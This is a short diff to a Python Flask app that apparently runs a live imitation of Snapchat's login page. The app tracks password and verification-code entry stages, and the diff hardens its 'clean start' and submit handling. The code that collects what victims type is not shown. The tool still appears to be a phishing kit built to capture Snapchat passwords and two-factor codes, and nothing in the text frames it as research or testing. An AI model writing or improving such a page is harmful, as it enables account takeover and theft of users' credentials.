@@ -20,7 +20,8 @@ session_state = {
     'password_entered': False,
     'code_entered': False,
     'update_count': 0,
-    'last_action': None
+    'last_action': None,
+    'last_submit_ts': 0
 }
 
 def create_real_snapchat_screenshot(stage='login', password_filled=False, code_filled=False):
@@ -147,18 +148,19 @@ def create_real_snapchat_screenshot(stage='login', password_filled=False, code_f
 
 def screenshot_loop():
     global session_state
-    print("[SESSION] Starting clean Snapchat simulation...")
+    print("[SESSION] Starting FORCED CLEAN Snapchat login simulation...")
     
-    # Always start clean
+    # === HARD CLEAN START EVERY TIME ===
     session_state['stage'] = 'login'
     session_state['password_entered'] = False
     session_state['code_entered'] = False
     session_state['update_count'] = 0
+    session_state['last_action'] = 'clean start'
     
     create_real_snapchat_screenshot('login')
     session_state['started'] = True
     
-    print("[SESSION] Clean Snapchat login page active")
+    print("[SESSION] Clean Snapchat login page is now live. Will only change on submit.")
     
     while True:
         stage = session_state.get('stage', 'login')
@@ -167,7 +169,7 @@ def screenshot_loop():
             password_filled=session_state.get('password_entered', False),
             code_filled=session_state.get('code_entered', False)
         )
-        time.sleep(0.85)
+        time.sleep(0.82)
 
 @app.route('/')
 def index():
